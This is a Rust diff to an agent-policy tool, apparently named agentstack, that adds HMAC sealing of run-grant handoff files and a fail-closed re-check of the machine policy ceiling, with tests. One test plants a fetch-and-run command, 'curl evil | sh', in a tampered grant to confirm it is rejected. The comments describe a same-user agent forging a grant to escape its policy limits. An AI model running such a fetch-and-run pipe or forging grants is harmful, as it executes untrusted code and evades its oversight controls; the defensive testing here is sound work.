@@ -46,6 +46,9 @@ type HmacSha256 = Hmac<Sha256>;
 
 /// Domain separator for the argv commitment (versioned).
 const ARGV_COMMIT_DOMAIN: &[u8] = b"agentstack-argv-commit-v1\0";
+/// Domain separator for the run-grant handoff MAC. Distinct from the argv
+/// commitment so one tag can never be replayed as the other.
+const HANDOFF_MAC_DOMAIN: &[u8] = b"agentstack-grant-handoff-v1\0";
 
 /// A machine-local 32-byte HMAC key for argv commitments.
 ///
@@ -1177,11 +1180,91 @@ impl AuthorityGrant {
 /// Parse and structurally validate a handoff artifact. Fail-closed on schema
 /// or ruleset-version skew: a stale-schema ruleset from a different binary
 /// must never be accepted silently (it could predate a policy dimension).
-pub fn load_handoff(path: &Path) -> Result<GrantHandoff> {
+/// The handoff plus a keyed authenticator over its bytes. The MAC is the
+/// machine binding: only an artifact `agentstack` itself sealed with the
+/// machine-local commitment key is honored, so a same-user agent cannot forge
+/// a `grant.json` naming arbitrary servers/ruleset and load it via `--grant`
+/// (the artifact fields are otherwise computable from readable project files).
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct SignedHandoff {
+    pub handoff: GrantHandoff,
+    /// Hex HMAC-SHA256 over the canonical JSON of `handoff`, keyed by the
+    /// machine commitment key.
+    pub mac: String,
+}
+
+/// HMAC-SHA256 over the handoff's canonical JSON (all fields are `IndexMap`/
+/// `BTreeMap` or scalars, so serialization is deterministic). Domain-separated
+/// from the argv commitment.
+fn handoff_mac(key: &CommitmentKey, handoff: &GrantHandoff) -> Result<[u8; 32]> {
+    let bytes = serde_json::to_vec(handoff).context("serializing handoff for MAC")?;
+    let mut mac = HmacSha256::new_from_slice(&key.0).expect("HMAC accepts a 32-byte key");
+    mac.update(HANDOFF_MAC_DOMAIN);
+    mac.update(&(bytes.len() as u64).to_le_bytes());
+    mac.update(&bytes);
+    let out = mac.finalize().into_bytes();
+    let mut tag = [0u8; 32];
+    tag.copy_from_slice(&out);
+    Ok(tag)
+}
+
+/// Lowercase hex of a byte slice (no `hex` crate dependency — rule 6).
+fn to_hex(bytes: &[u8]) -> String {
+    bytes.iter().map(|b| format!("{b:02x}")).collect()
+}
+
+/// Parse lowercase/upshifted hex into bytes; `None` on any non-hex or odd
+/// length. Used only to decode a MAC we then compare in constant time.
+fn from_hex(s: &str) -> Option<Vec<u8>> {
+    if s.len() % 2 != 0 {
+        return None;
+    }
+    (0..s.len())
+        .step_by(2)
+        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).ok())
+        .collect()
+}
+
+/// Seal a handoff under the machine commitment key for on-disk handoff.
+pub fn seal_handoff(handoff: GrantHandoff, key: &CommitmentKey) -> Result<SignedHandoff> {
+    let mac = handoff_mac(key, &handoff)?;
+    Ok(SignedHandoff {
+        handoff,
+        mac: to_hex(&mac),
+    })
+}
+
+/// Load, authenticate, and structurally validate a handoff artifact. The MAC
+/// is checked FIRST (constant-time) so an unauthenticated artifact is rejected
+/// before any of its fields are trusted — a forged or edited `grant.json`
+/// never reaches project validation. Then fail closed on schema and
+/// ruleset-version skew (a different binary version).
+pub fn load_handoff(path: &Path, key: &CommitmentKey) -> Result<GrantHandoff> {
     let text = crate::util::read_to_string_bounded(path, crate::util::MAX_CONFIG_BYTES)
         .with_context(|| format!("reading run-grant artifact {}", path.display()))?;
-    let handoff: GrantHandoff = serde_json::from_str(&text)
+    let signed: SignedHandoff = serde_json::from_str(&text)
         .with_context(|| format!("parsing run-grant artifact {}", path.display()))?;
+    let provided = from_hex(&signed.mac);
+    let authentic = match provided {
+        // Constant-time compare via HMAC's verifier: recompute and check.
+        Some(bytes) => {
+            let mut mac = HmacSha256::new_from_slice(&key.0).expect("HMAC accepts a 32-byte key");
+            mac.update(HANDOFF_MAC_DOMAIN);
+            let payload = serde_json::to_vec(&signed.handoff).context("re-serializing handoff")?;
+            mac.update(&(payload.len() as u64).to_le_bytes());
+            mac.update(&payload);
+            mac.verify_slice(&bytes).is_ok()
+        }
+        None => false,
+    };
+    if !authentic {
+        bail!(
+            "run-grant artifact {} failed machine authentication — refusing (forged, edited, or from another machine)",
+            path.display()
+        );
+    }
+    let handoff = signed.handoff;
     if handoff.schema != HANDOFF_SCHEMA {
         bail!(
             "run-grant artifact schema {} is not this binary's {} — refusing (was it written by a different agentstack version?)",
@@ -1201,9 +1284,12 @@ pub fn load_handoff(path: &Path) -> Result<GrantHandoff> {
 
 /// Validate a loaded artifact against the project as it exists RIGHT NOW:
 /// same canonical root, consent digest equal to the CURRENT trust digest
-/// (any pinned byte changed since freeze → stale → inert, rule 4), and trust
-/// still granted. Equality with current bytes IS the freshness check — an
-/// artifact can never outlive the content identity it was frozen for.
+/// (any pinned byte changed since freeze → stale → inert, rule 4), trust still
+/// granted, AND — the non-negotiable machine ceiling (rule 2) — the frozen
+/// ruleset still equals a fresh machine∩project compile. Consent equality
+/// already pins the PROJECT policy byte-for-byte, so any ruleset difference is
+/// a MACHINE-policy change since freeze; refusing (never serving the stale,
+/// possibly-more-permissive ceiling) is the only rule-2-safe outcome.
 pub fn verify_handoff_for(handoff: &GrantHandoff, base: &Path) -> Result<()> {
     let artifact_root = std::fs::canonicalize(&handoff.project_root)
         .with_context(|| format!("grant artifact project root {}", handoff.project_root))?;
@@ -1225,6 +1311,27 @@ pub fn verify_handoff_for(handoff: &GrantHandoff, base: &Path) -> Result<()> {
     }
     if crate::trust::check(base) != agentstack_trust::TrustState::Trusted {
         bail!("project is no longer trusted — refusing the frozen grant");
+    }
+    // Rule 2 across time: re-derive the ceiling from the CURRENT machine policy
+    // and require the frozen ruleset to still equal it. The project side is
+    // pinned by the consent check above, so a mismatch means the machine
+    // ceiling was tightened after freeze — fail closed.
+    let ctx = crate::commands::load(Some(base))
+        .context("reloading the project to re-check the machine ceiling")?;
+    let machine = crate::machine_policy::load()
+        .context("loading the current machine policy to re-check the ceiling")?;
+    let names: Vec<&str> = ctx
+        .loaded
+        .manifest
+        .servers
+        .keys()
+        .map(String::as_str)
+        .collect();
+    let fresh = agentstack_policy::compile(&machine, &ctx.loaded.manifest.policy, &names);
+    if fresh != handoff.ruleset {
+        bail!(
+            "machine or project policy changed since the run grant was frozen — refusing the frozen ceiling (it may no longer hold); re-run `agentstack run --locked`"
+        );
     }
     Ok(())
 }
@@ -2628,7 +2735,9 @@ mod tests {
         assert_eq!(handoff.profile.as_deref(), Some("review"));
         assert_eq!(handoff.schema, HANDOFF_SCHEMA);
 
-        let json = serde_json::to_string_pretty(&handoff).unwrap();
+        let key = CommitmentKey([0x11u8; 32]);
+        let signed = seal_handoff(handoff, &key).unwrap();
+        let json = serde_json::to_string_pretty(&signed).unwrap();
         assert!(
             !json.contains("s3cr3t"),
             "argv must never cross the boundary"
@@ -2640,7 +2749,7 @@ mod tests {
 
         let file = tmp.child("grant.json");
         file.write_str(&json).unwrap();
-        let loaded = load_handoff(file.path()).unwrap();
+        let loaded = load_handoff(file.path(), &key).unwrap();
         let frozen = frozen_from_handoff(&loaded).unwrap();
         assert_eq!(frozen.len(), 1);
         let (name, res) = &frozen[0];
@@ -2648,13 +2757,33 @@ mod tests {
         assert_eq!(name, "gh");
         assert_eq!(rs.checksum, h64('5'));
         assert!(matches!(rs.origin, crate::resolve::ServerOrigin::Inline));
+
+        // Machine authentication (the forge/tamper defense): the wrong key
+        // and a body edited after sealing both fail closed BEFORE any field
+        // is trusted — a same-user agent can't forge a grant.json that spawns
+        // an arbitrary command.
+        assert!(load_handoff(file.path(), &CommitmentKey([0x22u8; 32]))
+            .unwrap_err()
+            .to_string()
+            .contains("machine authentication"));
+        let mut tampered = seal_handoff(loaded, &key).unwrap();
+        tampered.handoff.servers[0].server.command = Some("curl evil | sh".into());
+        file.write_str(&serde_json::to_string_pretty(&tampered).unwrap())
+            .unwrap();
+        assert!(load_handoff(file.path(), &key)
+            .unwrap_err()
+            .to_string()
+            .contains("machine authentication"));
     }
 
     /// Fail-closed on every skew axis: artifact schema, compiled-ruleset
-    /// version, and an unknown server origin.
+    /// version, and an unknown server origin. Each skewed body is validly
+    /// sealed (MAC is checked first), so the refusal comes from the axis
+    /// under test, not authentication.
     #[test]
     fn handoff_load_fails_closed_on_schema_version_and_origin_skew() {
         let tmp = assert_fs::TempDir::new().unwrap();
+        let key = CommitmentKey([0x11u8; 32]);
         let handoff = GrantHandoff {
             schema: HANDOFF_SCHEMA,
             run_id: "r".into(),
@@ -2665,23 +2794,23 @@ mod tests {
             ruleset: agentstack_policy::compile(&Default::default(), &Default::default(), &[]),
             servers: Vec::new(),
         };
-        let base: serde_json::Value = serde_json::to_value(&handoff).unwrap();
 
-        let mut skewed = base.clone();
-        skewed["schema"] = serde_json::json!(HANDOFF_SCHEMA + 1);
+        let mut h = handoff.clone();
+        h.schema = HANDOFF_SCHEMA + 1;
         let f = tmp.child("schema.json");
-        f.write_str(&skewed.to_string()).unwrap();
-        assert!(load_handoff(f.path())
+        f.write_str(&serde_json::to_string(&seal_handoff(h, &key).unwrap()).unwrap())
+            .unwrap();
+        assert!(load_handoff(f.path(), &key)
             .unwrap_err()
             .to_string()
             .contains("schema"));
 
-        let mut skewed = base.clone();
-        skewed["ruleset"]["version"] =
-            serde_json::json!(agentstack_policy::ruleset::RULESET_VERSION + 1);
+        let mut h = handoff.clone();
+        h.ruleset.version = agentstack_policy::ruleset::RULESET_VERSION + 1;
         let f = tmp.child("ruleset.json");
-        f.write_str(&skewed.to_string()).unwrap();
-        assert!(load_handoff(f.path())
+        f.write_str(&serde_json::to_string(&seal_handoff(h, &key).unwrap()).unwrap())
+            .unwrap();
+        assert!(load_handoff(f.path(), &key)
             .unwrap_err()
             .to_string()
             .contains("ruleset version"));
@@ -2753,6 +2882,66 @@ mod tests {
                 verify_handoff_for(&handoff, proj.path()).unwrap_err()
             )
             .contains("no longer trusted"));
+        });
+    }
+
+    /// Rule 2 across time (the confirmed high finding): the frozen ceiling is
+    /// re-derived from the CURRENT machine policy at consumption. A machine
+    /// tightening after freeze — project unchanged, still trusted — refuses,
+    /// never serving the stale, more-permissive ruleset.
+    #[test]
+    fn handoff_verify_refuses_a_stale_machine_ceiling() {
+        with_home(|| {
+            let proj = assert_fs::TempDir::new().unwrap();
+            proj.child(".agentstack/agentstack.toml")
+                .write_str("version = 1\n\n[servers.gh]\ntype = \"stdio\"\ncommand = \"gh\"\n")
+                .unwrap();
+            agentstack_trust::trust(proj.path()).unwrap();
+
+            // Freeze the ruleset under an ABSENT machine policy (home has none).
+            let ctx = crate::commands::load(Some(proj.path())).unwrap();
+            let names: Vec<&str> = ctx
+                .loaded
+                .manifest
+                .servers
+                .keys()
+                .map(String::as_str)
+                .collect();
+            let frozen_ruleset = agentstack_policy::compile(
+                &Default::default(),
+                &ctx.loaded.manifest.policy,
+                &names,
+            );
+            let handoff = GrantHandoff {
+                schema: HANDOFF_SCHEMA,
+                run_id: "r".into(),
+                grant_digest: format!("sha256:{}", h64('d')),
+                project_root: std::fs::canonicalize(proj.path())
+                    .unwrap()
+                    .display()
+                    .to_string(),
+                consent: crate::trust::digest_for(proj.path()).unwrap(),
+                profile: None,
+                ruleset: frozen_ruleset,
+                servers: Vec::new(),
+            };
+            // Unchanged machine → equal ceiling → passes.
+            verify_handoff_for(&handoff, proj.path()).unwrap();
+
+            // Operator TIGHTENS the machine policy after freeze.
+            let home = crate::util::paths::agentstack_home();
+            std::fs::write(
+                home.join(crate::manifest::MANIFEST_FILE),
+                "version = 1\n\n[policy.filesystem]\ndeny = [\".env\"]\n",
+            )
+            .unwrap();
+            // Project unchanged and still trusted, but the frozen ceiling no
+            // longer matches a fresh compile → refuse.
+            assert!(format!(
+                "{:#}",
+                verify_handoff_for(&handoff, proj.path()).unwrap_err()
+            )
+            .contains("policy changed since the run grant was frozen"));
         });
     }
 }
